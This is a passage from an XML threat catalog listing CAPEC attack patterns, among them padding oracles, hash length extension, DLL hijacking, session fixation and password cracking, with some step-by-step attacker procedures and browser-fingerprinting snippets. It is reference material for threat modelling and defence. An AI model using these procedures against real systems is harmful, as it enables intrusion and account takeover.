  <description>An attacker overrides or adds the HTTP GET/POST parameters by injecting query string delimiters. Via HPP it may be possible to override existing hardcoded HTTP parameters, modify the application behaviors, access and, potentially exploit, uncontrollable variables, and bypass input validation checkpoints and WAF rules.</description>
</threat>
<threat label="CAPEC-461" name="Web Services API Signature Forgery Leveraging Hash Function Extension Weakness" type="Standard" reference="CAPEC">
  <description>When web services require callees to authenticate, they sometimes issue a token / secret to the caller that the caller is to use to sign their web service calls. In one such scheme the caller when constructing a request would concatenate all of the parameters passed to the web service with the provided authentication token and then generate a hash of the concatenated string (e.g., MD5, SHA1, etc.). That hash then forms the signature that is passed to the web service which is used on the server side to verify the origin authenticity and integrity of the message. There is a practical attack against an authentication scheme of this nature that makes use of the hash function extension / padding weakness. Leveraging this weakness, an attacker, who does not know the secret token, is able to modify the parameters passed to the web service by generating their own call and still generate a legitimate signature hash. For instance, consider the message to be passed to the web service is M (this message includes the parameters passed to the web service concatenated with the secret token / key bytes). The message M is hashed and that hash is passed to the web service and is used for authentication. The attacker does not know M, but can see Hash (M) and Length (M). The attacker can then compute Hash (M || Padding (M) II M') for any M'. The attacker does not know the entire message M, specifically the attacker does not know the secret bytes, but that does not matter. The attacker is still able to sign their own message M' and make the called web service verify the integrity of the message without an error. Because of the iterative design of the hash function, it is possible, from only the hash of a message and its length, to compute the hash of longer messages that start with the initial message and include the padding required for the initial message to reach a multiple of 512 bits. It is important to note that the attack not limited to MD5 and will work just as well with another hash function like SHA1.</description>
</threat>
<threat label="CAPEC-462" name="Cross-Domain Search Timing" type="Detailed" reference="CAPEC">
  <description>An attacker initiates cross domain HTTP / GET requests and times the server responses. The timing of these responses may leak important information on what is happening on the server. Browser's single origin policy prevents the attacker from directly reading the server responses (in the absense of any other weaknesses), but does not prevent the attacker from timing the responses to requests that the attacker issued cross domain.For GET requests an attacker could for instance leverage the &quot;img&quot; tag in conjunction with &quot;onload() / onerror()&quot; javascript events. For the POST requests, an attacker could leverage the &quot;iframe&quot; element and leverage the &quot;onload()&quot; event. There is nothing in the current browser security model that prevents an attacker to use these methods to time responses to the attacker's cross domain requests.The timing for these responses leaks information. For instance, if a victim has an active session with their online e-mail account, an attacker could issue search requests in the victim's mailbox. While the attacker is not able to view the responses, based on the timings of the responses, the attacker could ask yes / no questions as to the content of victim's e-mails, who the victim e-mailed, when, etc. This is but one example; There are other scenarios where an attacker could infer potentially sensitive information from cross domain requests by timing the responses while asking the right questions that leak information.</description>
</threat>
<threat label="CAPEC-463" name="Padding Oracle Crypto Attack" type="Meta" reference="CAPEC">
  <description>An attacker is able to efficiently decrypt data without knowing the decryption key if a target system leaks data on whether or not a padding error happened while decrypting the ciphertext. A target system that leaks this type of information becomes the padding oracle and an attacker is able to make use of that oracle to efficiently decrypt data without knowing the decryption key by issuinig on average 128*b calls to the padding oracle (where b is the number of bytes in the ciphertext block). In addition to performing decryption, an attacker is also able to produce valid ciphertexts (i.e., perform encryption) by using the padding oracle, all without knowing the encryption key.Any cryptosystem can be vulnerable to padding oracle attacks if the encrypted messages are not authenticated to ensure their validity prior to decryption, and then the information about padding error is leaked to the attacker. This attack technique may be used, for instance, to break CAPTCHA systems or decrypt/modify state information stored in client side objects (e.g., hidden fields or cookies).This attack technique is a side-channel attack on the cryptosystem that uses a data leak from an improperly implemented decryption routine to completely subvert the cryptosystem. The one bit of information that tells the attacker whether a padding error during decryption has occured, in whatever form it comes, is sufficient for the attacker to break the cryptosystem. That bit of information can come in a form of an explicit error message about a padding error, a returned blank page, or even the server taking longer to respond (a timing attack).This attack can be launched cross domain where an attacker is able to use cross-domain information leaks to get the bits of information from the padding oracle from a target system / service with which the victim is communicating. To do so an attacker sends a request containing ciphertext to the target system. Due to the browser's single origin policy, the attacker is not able to see the response directly, but can use cross-domain information leak techniques to still get the information needed (i.e., information on whether or not a padding error has occurred). For instance, this can be done using &quot;img&quot; tag plus the onerror()/onload() events. The attacker's JavaScript can make web browsers to load an image on the target site, and know if the image is loaded or not. This is 1-bit information needed for the padding oracle attack to work: if the image is loaded, then it is valid padding, otherwise it is not.</description>
</threat>
<threat label="CAPEC-464" name="Evercookie" type="Standard" reference="CAPEC">
  <description>An attacker creates a very persistent cookie that is then sent by the server to the victim's browser when the victim visits a website. The cookie is stored on the victim's machine in over ten places to include: Standard HTTP Cookies, Local Shared Objects (Flash Cookies), Silverlight Isolated Storage, Storing cookies in RGB values of auto-generated, force-cached, PNGs using HTML5 Canvas tag to read pixels (cookies) back out, Storing cookies in Web History, Storing cookies in HTTP ETags, Storing cookies in Web cache, window.name caching, Internet Explorer userData storage, HTML5 Session Storage, HTML5 Local Storage, HTML5 Global Storage, HTML5 Database Storage via SQLite, among others.When the victim clears the cookie cache via traditional means inside the browser, that operation removes the cookie from certain places but not others. The malicious code then replicates the cookie from all of the places where it was not deleted to all of the possible storage locations once again. So the victim again has the cookie in all of the original storage locations. In other words, failure to delete the cookie in even one location will result in the cookie's resurrection everywhere. The evercookie will also persist across different browsers because certain stores (e.g., Local Shared Objects) are shared between different browsers.</description>
</threat>
<threat label="CAPEC-465" name="Socket Capable Browser Plugins Result In Transparent Proxy Abuse" type="Detailed" reference="CAPEC">
  <description>A transparent proxy serves as an intermediate between the client and the internet at large. It intercepts all requests originating from the client and forwards them to the correct location. The proxy also intercepts all responses to the client and forwards these to the client. All of this is done in a manner transparent to the client. Transparent proxies are often used by enterprises and ISPs.For requests originating at the client transparent proxies need to figure out the final destination of the client's data packet. Two ways are available to do that: either by looking at the layer three (network) IP address or by examining layer seven (application) HTTP header destination.A browser has single origin policy that typically prevents scripts coming from one domain initiating requests to other websites from which they did not come. To circumvent that, however, malicious Flash or an Applet that is executing in the user's browser can attempt to create a cross-domain socket connection from the client to the remote domain. The transparent proxy will examine the HTTP header of the request and direct it to the remote site thereby partially bypassing the browser's single origin policy. This can happen if the transparent proxy uses the HTTP host header information for addressing rather than the IP address information at the network layer. This attack allows malicious scripts inside the victim's browser to issue cross-domain requests to any hosts accessible to the transparent proxy.</description>
</threat>
<threat label="CAPEC-466" name="Leveraging Active Man in the Middle Attacks to Bypass Single Origin Policy" type="Meta" reference="CAPEC">
  <description>An attacker leverages a man in the middle attack in order to bypass the single origin policy protection in the victim's browser. This active man in the middle attack could be launched, for instance, when the victim is connected to a public WIFI hot spot. An attacker is able to intercept requests and responses between the victim's browser and some non-sensitive website that does not use TLS. For instance, the victim may be checking flight or weather information.When an attacker intercepts a response bound to the victim, an attacker adds an iFrame (which is possibly invisible) to the response referencing some domain with sensitive functionality and forwards the response to the victim. The victim's browser than automatically initiates an unauthorized request to the site with sensitive functionality. The single origin policy would prevent making these requests to a site other than the one from which the Java Script came, but the attacker once again uses active man in the middle to intercept these automatic requests and redirect them to the domain / service with sensitive funcitonality. Any persistent cookies that the victim has in his or her browser would be used for these unauthorized requests. The attacker thus actively directs the victim to a site with sensitive functionality.When the site with sensitive functionality responds back to the victim's request, an active man in the middle attacker intercepts these responses, injects his or her own malicious Java Script into these responses, and forwards to the victim's browser. In the victim's browser, that Java Script executes under the restrictions of the site with sensitive functionality and can essentially be used to continue to interact with the sensitive site. So an attacker can execute scripts within the victim's browser on any domains the attacker desires.The attacker is able to use this technique to steal cookies from the victim's browser for whatever site the attacker wants. This applies to both persistent cookies and HTTP only cookies (unlike traditional XSS attacks).An attacker is also able to use this technique to steal authentication credentials for sites that only encrypt the login form, but do not require a secure channel for the initial request to get to the page with the login form. Further the attacker is also able to steal any autocompletion information. This attack pattern can also be used to enable session fixation and cache poisoning attacks. Additional attacks can be enabled as well.</description>
</threat>
<threat label="CAPEC-467" name="Cross Site Identification" type="Detailed" reference="CAPEC">
  <description>An attacker harvests identifying information about a victim via an active session that the victim's browser has with a social networking site. A victim may have the social networking site open in one tab or perhaps is simply using the &quot;remember me&quot; feature to keep his or her session with the social networking site active. An attacker induces a payload to execute in the victim's browser that transparently to the victim initiates a request to the social networking site (e.g., via available social network site APIs) to retrieve identifying information about a victim. While some of this information may be public, the attacker is able to harvest this information in context and may use it for further attacks on the user (e.g., spear phishing).In one example of an attack, an attacker may post a malicious posting that contains an image with an embedded link. The link actually requests identifying information from the social networking site. A victim who views the malicious posting in his or her browser will have sent idenditifying information to the attacker, as long as the victim had an active session with the social networking site. There are many other ways in which the attacker may get the payload to execute in the victim's browser mainly by finding a way to hide it in some reputable site that the victim visits. The attacker could also send the link to the victim in an e-mail and trick the victim into clicking on the link.This attack is basically a cross site request forgery attack with two main differences. First, there is no action that is performed on behalf of the user aside from harvesting information. So standard CSRF protection may not work in this situation. Second, what is important in this attack pattern is the nature of the data being harvested, which is identifying information that can be obtained and used in context. This real time harvesting of identifying information can be used as a prelude for launching real time targetted social engineering attacks on the victim.</description>
</threat>
<threat label="CAPEC-468" name="Generic Cross-Browser Cross-Domain Theft" type="Standard" reference="CAPEC">
  <description>An attacker makes use of Cascading Style Sheets (CSS) injection to steal data cross domain from the victim's browser. The attack works by abusing the standards relating to loading of CSS: 1. Send cookies on any load of CSS (including cross-domain) 2. When parsing returned CSS ignore all data that does not make sense before a valid CSS descriptor is found by the CSS parserBy having control of some text in the victim's domain, the attacker is able to inject a seemingly valid CSS string. It does not matter if this CSS string is preceeded by other data. The CSS parser will still locate the CSS string.If the attacker is able to control two injection points, one before the cross domain data that the attacker is interested in receiving and the other one after, the attacker can use this attack to steal all of the data in between these two CSS injection points when referencing the injected CSS while performing rendering on the site that the attacker controls. When rendering, the CSS parser will detect the valid CSS string to parse and ignore the data that &quot;does not make sense&quot;. That data will simply be rendered. That data is in fact the data that the attacker just stole cross domain.The stolen data may contain sensitive information, such CSRF protection tokens.</description>
</threat>
<threat label="CAPEC-469" name="HTTP DoS" type="Detailed" reference="CAPEC">
  <description>An attacker performs flooding at the HTTP level to bring down only a particular web application rather than anything listening on a TCP/IP connection. This denial of service attack requires substantially fewer packets to be sent which makes DoS harder to detect. This is an equivalent of SYN flood in HTTP.The idea is to keep the HTTP session alive indefinitely and then repeat that hundreds of times. This attack targets resource depletion weaknesses in web server software. The web server will wait to attacker's responses on the initiated HTTP sessions while the connection threads are being exhausted.</description>
</threat>
<threat label="CAPEC-47" name="Buffer Overflow via Parameter Expansion" type="Detailed" reference="CAPEC">
  <description>In this attack, the target software is given input that the attacker knows will be modified and expanded in size during processing. This attack relies on the target software failing to anticipate that the expanded data may exceed some internal limit, thereby creating a buffer overflow.Consider parts of the program where user supplied data may be expanded by the program. Use a disassembler and other reverse engineering tools to guide the search.Find a place where a buffer overflow occurs due to the fact that the new expanded size of the string is not correctly accounted for by the program. This may happen perhaps when the string is copied to another buffer that is big enough to hold the original, but not the expanded string. This may create an opportunity for planting the payload and redirecting program execution to the shellcode.Write the buffer overflow exploit. To be exploitable, the &quot;spill over&quot; amount (e.g. the difference between the expanded string length and the original string length before it was expanded) needs to be sufficient to allow the overflow of the stack return pointer (in the case of a stack overflow), without causing a stack corruption that would crash the program before it gets to execute the shellcode. Heap overflow will be more difficult and will require the attacker to get more lucky, by perhaps getting a chance to overwrite some of the accounting information stored as part of using malloc().</description>
</threat>
<threat label="CAPEC-470" name="Expanding Control over the Operating System from the Database" type="Meta" reference="CAPEC">
  <description>An attacker is able to leverage access gained to the database to read / write data to the file system, compromise the operating system, create a tunnel for accessing the host machine, and use this access to potentially attack other machines on the same network as the database machine.Traditionally SQL injections attacks are viewed as a way to gain anauthorized read access to the data stored in the database, modify the data in the database, delete the data, etc. However, almost every data base management system (DBMS) system includes facilities that if compromised allow an attacker complete access to the file system, operating system, and full access to the host running the database. The attacker can then use this privileged access to launch subsequent attacks.These facilities include dropping into a command shell, creating user defined functions that can call system level libraries present on the host machine, stored procedures, etc.</description>
</threat>
<threat label="CAPEC-471" name="DLL Search Order Hijacking" type="Standard" reference="CAPEC">
  <description>The attacker exploits the functionality of the Windows DLL loader where the process loading the DLL searches for the DLL to be loaded first in the same directory in which the process binary resides and then in other directories (e.g., System32). Exploitation of this preferential search order can allow an attacker to make the loading process load the attacker's rogue DLL rather than the legitimate DLL.For instance, an attacker with access to the file system may place a malicious ntshrui.dll in the C:\Windows directory. This DLL normally resides in the System32 folder. Process explorer.exe which also resides in C:\Windows, upon trying to load the ntshrui.dll from the System32 folder will actually load the DLL supplied by the attacker simply because of the preferential search order. Since the attacker has placed its malicius ntshrui.dll in the same directory as the loading explorer.exe process, the DLL supplied by the attacker will be found first and thus loaded in lieu of the legitimate DLL. Since explorer.exe is loaded during the boot cycle, the attacker's malware is guaranteed to execute.This attack can be leveraged with many different DLLs and with many different loading processes. No forensic trails are left in the system's registry or file system that an incorrect DLL had been loaded.</description>
</threat>
<threat label="CAPEC-472" name="Browser Fingerprinting" type="Detailed" reference="CAPEC">
  <description>An attacker carefully crafts small snippets of Java Script to efficiently detect the type of browser the potential victim is using. Having this knowledge allows an attacker to target the victim with attacks that specifically exploit known or zero day weaknesses in the type and version of the browser used by the victim.The following code snippets can be used to detect various browsers://Firefox 2/3FF=/a/[-1]=='a'//Firefox 3FF3=(function x(){})[-5]=='x'//Firefox 2FF2=(function x(){})[-6]=='x'//IEIE='\v'=='v'//SafariSaf=/a/.__proto__=='//'//ChromeChr=/source/.test((/a/.toString+''))//OperaOp=/^function \(/.test([].sort)</description>
</threat>
<threat label="CAPEC-48" name="Passing Local Filenames to Functions That Expect a URL" type="Detailed" reference="CAPEC">
  <description>This attack relies on client side code to access local files and resources instead of URLs. When the client browser is expecting a URL string, but instead receives a request for a local file, that execution is likely to occur in the browser process space with the browser's authority to local files. The attacker can send the results of this request to the local files out to a site that they control. This attack may be used to steal sensitive authentication data (either local or remote), or to gain system profile information to launch further attacks.</description>
</threat>
<threat label="CAPEC-49" name="Password Brute Forcing" type="Standard" reference="CAPEC">
  <description>In this attack, the attacker tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password.A system will be particularly vulnerable to this type of an attack if it does not have a proper enforcement mechanism in place to ensure that passwords selected by users are strong passwords that comply with an adequate password policy.In practice a pure brute force attack on passwords is rarely used, unless the password is suspected to be weak. Other password cracking methods exist that are far more effective (e.g. dictionary attacks, rainbow tables, etc.).Determine the password policies of the target application/system.Determine minimum and maximum allowed password lengths.Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).Passwords are used in the application/systemPasswords are not used for authentication; however, brute forcing of other protection mechanisms may also be possible.Given the finite space of possible passwords dictated by the password policy determined in the previous step, try all possible passwords for a known user ID until application/system grants access.Manually or automatically enter all possible passwords through the application/system's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.Perform an offline dictionary attack or a rainbow table attack against a known password hash.Weak passwords allowed, and no account lockout policy enforced.Password hashes can be captured by attacker.Accounts locked out after small number of failed authentication attempts.Many incorrect login attempts are detected by the system.Try to spoof IP addresses so that it does not look like the incorrect log in attempts are coming from the same computer.</description>
</threat>
<threat label="CAPEC-5" name="Analog In-band Switching Signals (aka Blue Boxing)" type="Detailed" reference="CAPEC">
  <description>This attack against older telephone switches and trunks has been around for decades. The signal is sent by the attacker to impersonate a supervisor signal. This has the effect of rerouting or usurping command of the line and call. While the US infrastructure proper may not contain widespread vulnerabilities to this type of attack, many companies are connected globally through call centers and business process outsourcing. These international systems may be operated in countries which have not upgraded telco infrastructure and so are vulnerable to Blue boxing.Blue boxing is a result of failure on the part of the system to enforce strong authentication for administrative functions. While the infrastructure is different than standard current applications like web applications, there are hisotrical lessons to be learned to upgrade the access control for administrative functions.Enables calls to be rerouted.</description>
</threat>
<threat label="CAPEC-50" name="Password Recovery Exploitation" type="Standard" reference="CAPEC">
  <description>An attacker may take advantage of the application feature to help users recover their forgotten passwords in order to gain access into the system with the same privileges as the original user. Generally password recovery schemes tend to be weak and insecure. Most of them use only one security question . For instance, mother's maiden name tends to be a fairly popular one. Unfortunately in many cases this information is not very hard to find, especially if the attacker knows the legitimate user.These generic security questions are also re-used across many applications, thus making them even more insecure. An attacker could for instance overhear a coworker talking to a bank representative at the work place and supplying their mother's maiden name for verification purposes. An attacker can then try to log in into one of the victim's accounts, click on &quot;forgot password&quot; and there is a good chance that the security question there will be to provide mother's maden name.A weak password recovery scheme totally undermines the effectiveness of a strong password scheme.Understand the password recovery mechanism and how it works.Find a weakness in the password recovery mechanism and exploit it. For instance, a weakness may be that a standard single security question is used with an easy to determine answer.Trial and error (brute force).Social Engineering.Many incorrect attempts to answer the security question.</description>
</threat>
<threat label="CAPEC-51" name="Poison Web Service Registry" type="Standard" reference="CAPEC">
  <description>SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata (to effect a denial of service), and delete information about service provider interfaces.WS-Addressing is used to virtualize services, provide return addresses and other routing information, however, unless the WS-Addressing headers are protected they are vulnerable to rewriting. The attacker that can rewrite WS-addressing information gains the ability to route service requesters to any service providers, and the ability to route service provider response to any service.Content in a registry is deployed by the service provider. The registry in an SOA or Web Services system can be accessed by the service requester via UDDI or other protocol. The basic flow for the attacker consists of either altering the data at rest in the registry or uploading malicious content by spoofing a service provider. The service requester is then redirected to send its requests and/or responses to services the attacker controls.Enables attacker to execute server side code with any commands that the program owner has privileges to.</description>
</threat>
<threat label="CAPEC-52" name="Embedding NULL Bytes" type="Detailed" reference="CAPEC">
  <description>An attacker embeds one or more null bytes in input to the target software. This attack relies on the usage of a null-valued byte as a string terminator in many environments. The goal is for certain components of the target software to stop processing the input when it encounters the null byte(s).Identify a place in the program where user input may be used to escalate privileges by for instance accessing unauthorized file system resources through directory browsing.An attacker realizes that there is a postfix data that gets in the way of getting to the desired resourcesAn attacker then ads a postfix NULL terminator to the supplied input in order to &quot;swallow&quot; the postfixed data when the insertion is taking place. With the postfix data that got in the way of the attack gone, the doors are opened for accessing the desired resources.</description>
</threat>
<threat label="CAPEC-53" name="Postfix, Null Terminate, and Backslash" type="Detailed" reference="CAPEC">
  <description>If a string is passed through a filter of some kind, then a terminal NULL may not be valid. Using alternate representation of NULL allows an attacker to embed the NULL midstring while postfixing the proper data so that the filter is avoided. One example is a filter that looks for a trailing slash character. If a string insertion is possible, but the slash must exist, an alternate encoding of NULL in midstring may be used.An attacker first probes to figure out what restrictions on input are placed by filter, such as a specific characters on the end of the URL.The attacker then injects a string of their choosing with a null terminator (using an alternate encoding such as %00), followed by a backslash (%5C), followed by some additional characters that are required to keep the filter happyThe malicious string then passes through the filter and passed to the underlying API. Everything after the null terminator is ignored. This may give an attacker the opportunity to access file system resources to which they should not have access and do other things.Some popular forms in which this takes place:Test the program with various inputs and observe the behavior of the filter. Overtime it should be possible to understand what the filter is expecting.Null characters are observed by the filter. The filter needs to be able to understand various encodings of the Null character, or only canonical data should be passed to it.</description>
</threat>
<threat label="CAPEC-54" name="Probing an Application Through Targeting its Error Reporting" type="Standard" reference="CAPEC">
  <description>An Attacker, aware of an application's location (and possibly authorized to use the application) can probe the application's structure and evaluate its robustness by probing its error conditions (not unlike one would during a 'fuzz' test, but more purposefully here) in order to support attacks such as blind SQL injection, or for the more general task of mapping the application to mount another subsequent attack.Determine user-controllable parameters of the applicationInject each parameter with content that causes an error condition to manifestModify the content of each parameter aaccording to observed error conditionsRepeat above steps with enough parameters until the application has been sufficiently mapped out to launch desired attack (for example, Blind SQL Injection)Repeated errors generated by the same piece of code are an indication, although it requires careful monitoring of the application and its associated error logs, if any.To defeat correlation, the attacker may try changing the origin IP addresses or client browser identification strings or start a new session from where he left off; any technique aimed at defeating the use of certain identification parameters for correlation goes a small way in obfuscating the attack.The impact of activation is an error condition that, hopefully for the attacker, reveals sufficient information to further map the application.</description>
</threat>
<threat label="CAPEC-55" name="Rainbow Table Password Cracking" type="Standard" reference="CAPEC">
  <description>An attacker gets access to the database table where hashes of passwords are stored. He then uses a rainbow table of precomputed hash chains to attempt to look up the original password. Once the original password corresponding to the hash is obtained, the attacker uses the original password to gain access to the system.A password rainbow table stores hash chains for various passwords. A password chain is computed, starting from the original password, P, via a a reduce(compression) function R and a hash function H. A recurrence relation exists where Xi+1 = R(H(Xi)), X0 = P. Then the hash chain of length n for the original password P can be formed: X1, X2, X3, ... , Xn-2, Xn-1, Xn, H(Xn). P and H(Xn) are then stored together in the rainbow table.Constructing the rainbow tables takes a very long time and is computationally expensive. A separate table needs to be constructed for the various hash algorithms (e.g. SHA1, MD5, etc.). However, once a rainbow table is computed, it can be very effective in cracking the passwords that have been hashed without the use of salt.Determine the password policies of the target application/system.Determine minimum and maximum allowed password lengths.Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).Passwords are used in the application/systemPasswords are not used in the application/systemAn attacker gets access to the database table storing hashes of passwords or potentially just discovers a hash of an indivual password.Obtain copy of database table or flat file containing password hashes (by breaking access controls, using SQL Injection, etc.)Obtain password hashes from platform-specific storage locations (e.g. Windows registry)Sniff network packets containing password hashes.Password authentication not used in application/system.An attacker finds or writes a password cracking tool that uses a previously computed rainbow table for the right hashing algorithm. It helps if the attacker knows what hashing algorithm was used by the password system.Run rainbow table-based password cracking tool such as Ophcrack or RainbowCrack. Reduction function must depend on application's/system's password policy.Success outcome in step 2.Failure outcome in step 2.This is a completely offline attack that an attacker can perform at their lesure after the password hashes are obtained.</description>
</threat>
<threat label="CAPEC-56" name="Removing/short-circuiting 'guard logic'" type="Standard" reference="CAPEC">
  <description>Attackers can, in some cases, get around logic put in place to 'guard' sensitive functionality or data.The attack may involve gaining access to and calling protected functionality (or accessing protected data) directly, may involve subverting some aspect of the guard's implementation, or outright removal of the guard, if possible.The attacker determines, through brute-forcing, reverse-engineering or other similar means, the location and logic of the guard elementThe attacker then tries to determine the mechanism to circumvent the guard.Once the mechanism has been determined, the attacker proceeds to access the protected functionalityAttackers may confine (and succeed with) probing as simple as exploring an application's functionality and its underlying mapping to server-side components. It is likely that for this to succeed, the Attacker will need a valid login.At the other extreme, Attackers capable of reverse engineering client code will have the ability to remove functionality or identify the whereabouts of sensitive data through whitebox analysis, such as review of reverse-engineered code.</description>
</threat>
<threat label="CAPEC-57" name="Utilizing REST's Trust in the System Resource to Register Man in the Middle" type="Detailed" reference="CAPEC">
  <description>This attack utlizes a Rest(REpresentational State Transfer)-style applications' trust in the system resources and environment to place man in the middle once SSL is terminated. Rest applications premise is that they leverage existing infrastructure to deliver web services functionality. An example of this is a Rest application that uses HTTP Get methods and receives a HTTP response with a XML document. These Rest style web services are deployed on existing infrastructure such as Apache and IIS web servers with no SOAP stack required. Unfortunately from a security standpoint, there frequently is no interoperable identity security mechanism deployed, so Rest developers often fall back to SSL to deliver security. In large data centers, SSL is typically terminated at the edge of the network - at the firewall, load balancer, or router. Once the SSL is terminated the HTTP request is in the clear (unless developers have hashed or encrypted the values, but this is rare). The attacker can utilize a sniffer such as Wireshark to snapshot the credentials, such as username and password that are passed in the clear once SSL is terminated.Once the attacker gathers these credentials, they can submit requests to the web service provider just as authorized user do. There is not typically an authentication on the client side, beyond what is passed in the request itself so once this is compromised, then this is generally sufficient to compromise the service's authentication scheme.Attacker may use a network sniffer to identify authentication credentials once SSL is terminated.Enables attacker to execute server side code with any commands that the program owner has privileges to.</description>
</threat>
<threat label="CAPEC-58" name="Restful Privilege Elevation" type="Detailed" reference="CAPEC">
  <description>Rest uses standard HTTP (Get, Put, Delete) style permissions methods, but these are not necessarily correlated generally with back end programs. Strict interpretation of HTTP get methods means that these HTTP Get services should not be used to delete information on the server, but there is no access control mechanism to back up this logic. This means that unless the services are properly ACL'd and the application's service implementation are following these guidelines then an HTTP request can easily execute a delete or update on the server side.The attacker identifies a HTTP Get URL such as http://victimsite/updateOrder, which calls out to a program to update orders on a database or other resource. The URL is not idempotent so the request can be submitted multiple times by the attacker, additionally, the attacker may be able to exploit the URL published as a Get method that actually performs updates (instead of merely retrieving data). This may result in malicious or inadvertent altering of data on the server.Attacker may enumerate URLs to identify vulnerable services.Enables attacker to execute server side code with any commands that the program owner has privileges to.</description>
</threat>
<threat label="CAPEC-59" name="Session Credential Falsification through Prediction" type="Detailed" reference="CAPEC">
  <description>This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.The attacker interacts with the target host and finds that session IDs are used to authenticate users.An attacker makes many anonymous connections and records the session IDs assigned.An attacker makes authorized connections and records the session tokens or credentials issued.Web applications use session IDsNetwork systems issue session IDs or connection IDsThe attacker studies the characteristics of the session ID (size, format, etc.). As a results the attacker finds that legitimate session IDs are predictable.Cryptanalysis. The attacker uses cryptanalysis to determine if the session IDs contain any cryptographic protections.Pattern tests. The attacker looks for patterns (odd/even, repetition, multiples, or other arithmetic relationships) between IDsComparison against time. The attacker plots or compares the issued IDs to the time they were issued to check for correlation.The attacker brute forces different values of session ID and manages to predict a valid session ID.The attacker models the session ID algorithm enough to produce a compatible series os IDs, or just one match.The attacker uses the falsified session ID to access the target system.The attacker loads the session ID into his web browser and browses to restricted data or functionality.The attacker loads the session ID into his network communications and impersonates a legitimate user to gain access to data or functionality.The attacker can perform analysis of the randomness of the session generation algortihm.The attacker may need to steal a few valid session IDs using a different type of attack. And then use those session ID to predict the following ones.The attacker can use brute force tools to find a valid session ID.</description>
</threat>
<threat label="CAPEC-6" name="Argument Injection" type="Standard" reference="CAPEC">
  <description>An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.Using an automated tool or manual discovery, the attacker identifies services or methods with arguments that could potentially be used as injection vectors (OS, API, SQL procedures, etc.).Manually cover the application and record the possible places where arguments could be passed into external systems.Use a spider, for web applications, to create a list of URLs and associated inputs.Arguments are used by the application in exposed services or methodsNo parameters appear to be used.Application does not use any inputs.Possibly using an automated tool, the attacker will perform injection variations of the arguments.Use a very large list of probe strings in order to detect if there is a positive result, and, what type of system has been targeted (if obscure).Use a proxy tool to record results, error messages and/or log if accessible.The application behaves like the injection has been a success.No result appears.The attacker injects specific syntax into a particular argument in order to generate a specific malicious effect in the targeted application.Manually inject specific payload into targeted argument.Enables attacker to execute server side code with any commands that the program owner has privileges to, this is particularly problematic when the sprogram is run as a system or privileged account.</description>
</threat>
<threat label="CAPEC-60" name="Reusing Session IDs (aka Session Replay)" type="Standard" reference="CAPEC">
  <description>This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.The attacker interacts with the target host and finds that session IDs are used to authenticate users.The attacker steals a session ID from a valid user.The attacker tries to use the stolen session ID to gain access to the system with the priviledges of the session ID's original owner.The attacker can listen to a conversation between the client and server and steal a valid session ID.The attacker can try to steal session information from the user's coookies.The attacker can try a valid session from a finished transaction and find out that the transaction associated with the session ID did not time out.</description>
</threat>
<threat label="CAPEC-61" name="Session Fixation" type="Standard" reference="CAPEC">
  <description>The attacker induces a client to establish a session with the target software using a session identifier provided by the attacker. Once the user successfully authenticates to the target software, the attacker uses the (now privileged) session identifier in their own transactions. This attack leverages the fact that the target software either relies on client-generated session identifiers or maintains the same session identifiers after privilege elevation.Setup a session: The attacker has to setup a trap session that provides a valid session identifier, or select an arbitrary identifier, depending on the mechanism employed by the application. A trap session is a dummy session established with the application by the attacker and is used solely for the purpose of obtaining valid session identifiers. The attacker may also be required to periodically refresh the trap session in order to obtain valid session identifiers.The attacker chooses a predefined identifier that he knows.The attacker creates a trap session for the victim.The application accepts predefined, or user-provided session IDsThe application ignores predefined, or user-provided session IDs and provides new session IDs.Fixate the session: The attacker now needs to transfer the session identifier from the trap session to the victim by introducing the session identifier into the victim's browser. This is known as fixating the session. The session identifier can be introduced into the victim's browser by leveraging cross site scripting vulnerability, using META tags or setting HTTP response headers in a variety of ways.Attackers can put links on web sites (such as forums, blogs, or comment forms).Attackers can establish rogue proxy servers for network protocols that give out the session ID and then redirect the connection to the legitimate service.Attackers can email attack URLs to potential victims through spam and phishing techniques.Takeover the fixated session: Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the fixated session identifier.The attacker loads the predefined session ID into his browser and browses to protected data or functionality.The attacker loads the predefined session ID into his software and utilizes functionality with the rights of the victim.Determining whether the target application server accepts preset session identifiers is relatively easy. The attacker may try setting session identifiers in the URL or hidden form fields or in cookies, depending upon application design. Having access to an account or by utilizing a dummy account, the attacker can determine whether the preset session identifiers are accepted or not.With code or design in hand, the attacker can readily verify whether preset session identifiers are accepted and whether identifiers are regenerated, and possible destroyed, when privilege levels change.There are no indicators for the server since a fixated session identifier is similar to an ordinarily generated one. However, too many invalid sessions due to invalid session identifiers is a potential warning.A client can be suspicious if a received link contains preset session identifiers. However, this depends on the client's knowledge of such an issue. Also, fixation through Cross Site Scripting or hidden form fields is usually difficult to detect.The payload activation impact is that a session identifier of the attacker's choice is considered valid and trust decisions by the application will be based on such a fixated identifier.</description>
</threat>
<threat label="CAPEC-62" name="Cross Site Request Forgery (aka Session Riding)" type="Standard" reference="CAPEC">
